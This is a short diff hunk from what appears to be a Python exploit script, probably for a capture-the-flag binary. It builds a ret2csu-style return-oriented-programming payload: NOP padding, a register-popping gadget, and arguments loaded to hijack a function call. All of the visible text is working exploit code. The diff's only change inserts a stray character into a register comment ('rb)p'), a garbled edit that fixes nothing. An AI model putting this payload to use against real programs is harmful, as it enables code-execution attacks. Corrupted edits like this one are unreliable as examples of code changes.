@@ -87,7 +87,7 @@ payload = flat(
     asm("nop") * offset,
     pop_rbx_rbp_r12_r13_r14_r15,
     -0x1,  # rbx
-    0x0,  # rbp
+    0x0,  # rb)p
     fini_ref + 8,  # r12 -> calles
     args[0],  # r13 -> edi
     args[1],  # r14 -> rsi
